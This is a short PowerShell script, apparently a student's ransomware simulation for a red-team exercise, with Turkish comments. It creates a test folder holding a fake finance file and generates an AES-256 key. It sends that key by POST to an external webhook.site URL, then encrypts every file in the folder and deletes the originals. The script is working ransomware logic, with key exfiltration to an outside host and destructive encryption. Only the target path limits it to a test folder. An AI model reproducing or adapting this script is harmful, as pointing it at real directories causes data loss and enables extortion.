# L15 Ransomware - Red Team Simulation
$hedefDizin = "$HOME\OneDrive\Masaüstü\vize-proje\Simulasyon-L15\hassas_veriler"
$webhookUrl = "https://webhook.site/adae2d2a-5068-48c8-adb5-9b38b13c9f24" 

# Test verisi oluştur
if (!(Test-Path $hedefDizin)) { New-Item -ItemType Directory -Path $hedefDizin }
"Sanal Finans Verisi: 50.000 TL" | Out-File "$hedefDizin\finans.txt"

# AES Anahtarı Üret (256-bit)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.GenerateKey()
$key = [Convert]::ToBase64String($aes.Key)

# Anahtarı Webhook'a Sızdır (Exfiltration)
$body = @{ student = "Eray Turan"; status = "Compromised"; key = $key } | ConvertTo-Json
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
    Write-Host "[+] Basarili: Anahtar Webhook'a gonderildi!" -ForegroundColor Green
} catch {
    Write-Host "[-] Baglanti Hatasi: Anahtar sizdirilamadi!" -ForegroundColor Red
    Write-Host "Hata Detayi: $($_.Exception.Message)" -ForegroundColor Gray
}

# Dosyaları Şifrele
Get-ChildItem $hedefDizin -File | ForEach-Object {
    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
    $enc = $aes.CreateEncryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.IO.File]::WriteAllBytes(($_.FullName + ".enc"), $enc)
    Remove-Item $_.FullName
}
Write-Host "[!] SALDIRI TAMAMLANDI: Dosyalar sifrelendi." -ForegroundColor Red
